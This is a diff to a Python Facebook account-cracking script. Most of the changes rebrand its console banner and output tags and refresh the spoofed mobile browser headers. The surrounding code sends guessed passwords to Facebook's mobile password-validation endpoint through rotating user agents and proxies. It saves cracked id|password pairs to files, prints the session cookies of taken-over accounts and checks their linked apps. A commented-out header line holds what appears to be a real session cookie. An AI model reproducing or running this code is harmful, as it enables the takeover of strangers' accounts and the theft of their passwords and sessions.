@@ -202,29 +202,29 @@ def banner():
 	clear()
 	print(f"""\x1b[0;34m 
 
- ██▀███   ▄▄▄     ▓██   ██▓ ██ ▄█▀ ▒█████   ▒█████  
-▓██ ▒ ██▒▒████▄    ▒██  ██▒ ██▄█▒ ▒██▒  ██▒▒██▒  ██▒
-▓██ ░▄█ ▒▒██  ▀█▄   ▒██ ██░▓███▄░ ▒██░  ██▒▒██░  ██▒
-▒██▀▀█▄  ░██▄▄▄▄██  ░ ▐██▓░▓██ █▄ ▒██   ██░▒██   ██░
-░██▓ ▒██▒ ▓█   ▓██▒ ░ ██▒▓░▒██▒ █▄░ ████▓▒░░ ████▓▒░
-░ ▒▓ ░▒▓░ ▒▒   ▓▒█░  ██▒▒▒ ▒ ▒▒ ▓▒░ ▒░▒░▒░ ░ ▒░▒░▒░ 
-  ░▒ ░ ▒░  ▒   ▒▒ ░▓██ ░▒░ ░ ░▒ ▒░  ░ ▒ ▒░   ░ ▒ ▒░ 
-  ░░   ░   ░   ▒   ▒ ▒ ░░  ░ ░░ ░ ░ ░ ░ ▒  ░ ░ ░ ▒  
-   ░           ░  ░░ ░     ░  ░       ░ ░      ░ ░  
+ 
+
+
+૮₍ ˃ ⤙ ˂ ₎ა
+ ./づᡕᠵ᠊ᡃ່࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘᠊᠊ࠢ࠘~~~~♡ * ‧₊˚*♡
 \033[1;31m""")
 
 os.system('clear')
 logo =""" \033[34;1m
- ██▀███   ▄▄▄     ▓██   ██▓ ██ ▄█▀ ▒█████   ▒█████  
-▓██ ▒ ██▒▒████▄    ▒██  ██▒ ██▄█▒ ▒██▒  ██▒▒██▒  ██▒
-▓██ ░▄█ ▒▒██  ▀█▄   ▒██ ██░▓███▄░ ▒██░  ██▒▒██░  ██▒
-▒██▀▀█▄  ░██▄▄▄▄██  ░ ▐██▓░▓██ █▄ ▒██   ██░▒██   ██░
-░██▓ ▒██▒ ▓█   ▓██▒ ░ ██▒▓░▒██▒ █▄░ ████▓▒░░ ████▓▒░
-░ ▒▓ ░▒▓░ ▒▒   ▓▒█░  ██▒▒▒ ▒ ▒▒ ▓▒░ ▒░▒░▒░ ░ ▒░▒░▒░ 
-  ░▒ ░ ▒░  ▒   ▒▒ ░▓██ ░▒░ ░ ░▒ ▒░  ░ ▒ ▒░   ░ ▒ ▒░ 
-  ░░   ░   ░   ▒   ▒ ▒ ░░  ░ ░░ ░ ░ ░ ░ ▒  ░ ░ ░ ▒  
-   ░           ░  ░░ ░     ░  ░       ░ ░      ░ ░  
-"""
+ 
+⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠖⢒⠂⢤⣀⠀⠀⠀⠀⠀⠀
+⢀⣀⠀⠀⠀⢠⠖⠁⠀⠀⠀⠀⠀⠀⠢⣥⣢⠀⠀⣠⣤
+⣟⣿⠀⣰⡿⠿⠷⠶⣄⠀⠀⠀⢠⠾⠟⠛⠛⢷⢀⣿⣇
+⠿⡂⢴⠁⠀⠀⠀⢀⠈⠆⠠⣮⣴⢤⡀⣀⣸⣗⣶⡧⠒
+⠀⠀⢹⠀⠀⠴⣺⣿⣿⠇⠀⠀⠛⡿⣽⣿⣽⠿⠛⢻⠀
+⠀⠀⡌⠀⠀⠈⠉⢩⠀⠀⠀⠀⠀⣸⣒⣄⠀⠀⠀⠀⠇
+⠀⠀⡇⠀⢀⡴⠖⠉⠛⠓⠲⠶⠾⠿⠿⠿⢏⡳⡀⠄⣾
+⠀⠀⠃⠀⠞⠀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣶⣿⣇⢧⠀⣿
+⠀⠀⡄⠀⠀⠀⠈⠫⢽⣽⣉⣹⣁⣧⣿⠟⣱⣿⣾⢀⣿
+⠀⠀⢃⠀⠀⠀⠀⠀⠀⠉⠙⠩⠤⠭⣶⣋⡟⢸⢁⣿⠏
+⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠝⡇⣘⡾⠋⠀
+⠀⠀⠀⠀⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣷⠋⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠑⠠⠤⠤⠤⠤⠾⠟⠋⠁⠀⠀⠀⠀
 def menu():
 	os.system('clear')
 	banner()
@@ -391,7 +391,7 @@ def crack(idf,pwv):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write(f"\r{H}[R4ykoo13]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}~{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r{H}[𝐑𝐀𝐖𝐀]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}~{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5; like Mac OS X) AppleWebKit/600.43 (KHTML, like Gecko)  Chrome/51.0.2458.138 Mobile Safari/602.3',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/601.12 (KHTML, like Gecko)  Chrome/47.0.1741.400 Mobile Safari/601.4',
@@ -507,23 +507,28 @@ def crack(idf,pwv):
 			'scheme': 'https',
 			'referer': 'https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-			'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-			'cache-control': 'max-age=0',
-			'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-			'viewport-width': '980',
+                        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+                        'cache-control': 'max-age=0',
+                      # 'cookie': 'datr=25a8ZZRH1c5ViiGrbFgYISE3; sb=25a8Ze8reha5oWQ6EfZbFjJw; ps_n=0; ps_l=0; vpd=v1%3B720x393x2.75; locale=tr_TR; zsh=ASRdlAWFH9jzsLzCw_Jqq8Sv5sNMDz6FzEBditTSJZPQ-5q87xvLtBn_qAO7OdQK1zebuUph5aL77Jec0VOlseSDrl-8Oh9c6FOgGCVEj3NwDPGSzZmCQugrtxJCnMQUJyHy2tDBV34WD7O3S_d-xE3Bk37aiRW-ZYIfDFK2-RLvwFc9dSt4xKhEpFUANu2WPD0N6uFmhWABD9n8hH7dYhnRuUW9Yj4MRYLNM_X839oJ8dqgVdPG2Q97YaNpHVRqVpRhNA-ZeNrkJwX_oD80uaR803L16q4HRQOJQY5Q4-LjWIJ6Q8tTIaiPJaQsq_lkkc8q; wl_cbv=v2%3Bclient_version%3A2412%3Btimestamp%3A1708407319; m_pixel_ratio=2.75; wd=393x720; fr=06vyUtMmdsqwTeBYB.AWUGXFvaqwnVRU5TFv_eDlRtYCQ.BlvJbb..AAA.0.0.Bl1Dpi.AWU1dmYxHw8',
+                        'dpr': '2.75',
+                        'sec-ch-prefers-color-scheme': 'light',
+                        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+                        'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+                        'sec-ch-ua-mobile': '?1',
+                        'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+                        'sec-ch-ua-platform': '"Android"',
+                        'sec-ch-ua-platform-version': '"11.0.0"',
+                        'sec-fetch-dest': 'document',
+                        'sec-fetch-mode': 'navigate',
+                        'sec-fetch-site': 'none',
+                        'sec-fetch-user': '?1',
+                        'upgrade-insecure-requests': '1',
+                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+                        'viewport-width': '980',
 }
 			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{M}[R4ykoo13-CP] {m}{idf} | {m}{pw} \n {M} \033[1;90m└──> \033[1;90m{ua} ')
+				#print(f'\r{M}[R4ykoo13-CP] {m}{idf} | {m}{pw} \n {M} \033[1;90m└──> \033[1;90m{ua} ')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -532,7 +537,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{h}[R4ykoo13-OK] {h}{idf} | {h}{pw} \n {h} └──> {kuki}')
+				print(f'\r{h}[𝐑𝐀𝐖𝐀-𝐎𝐊] {h}{idf} | {h}{pw} \n {h} └──> {kuki}')
 				os.system('espeak -a 300 " Raykoo,   ,  ok,   idd"')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(session,coki)
